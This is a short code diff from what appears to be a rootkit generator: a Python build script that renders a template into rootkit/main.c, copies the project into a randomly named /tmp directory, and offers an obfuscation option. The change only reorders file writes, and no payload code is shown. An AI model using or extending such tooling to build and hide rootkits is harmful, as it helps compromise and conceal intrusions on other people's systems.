@@ -40,15 +40,16 @@ with open("rootkit_files/rootkit_template.j2", "r") as f:
 tm = Template(template)
 msg = tm.render(rootkit)
 
-with open("rootkit/main.c", "w") as f:
-    f.write(msg)
-
 build_directory = ob.random_string()
-
 original_directory = os.getcwd()
 
 os.system("cp -r . /tmp/"+build_directory)
 os.chdir("/tmp/"+build_directory)
+
+with open("rootkit/main.c", "w") as f:
+    f.write(msg)
+
+
 os.system("mv rootkit_files/Makefile .")
 
 if args.obfuscate:
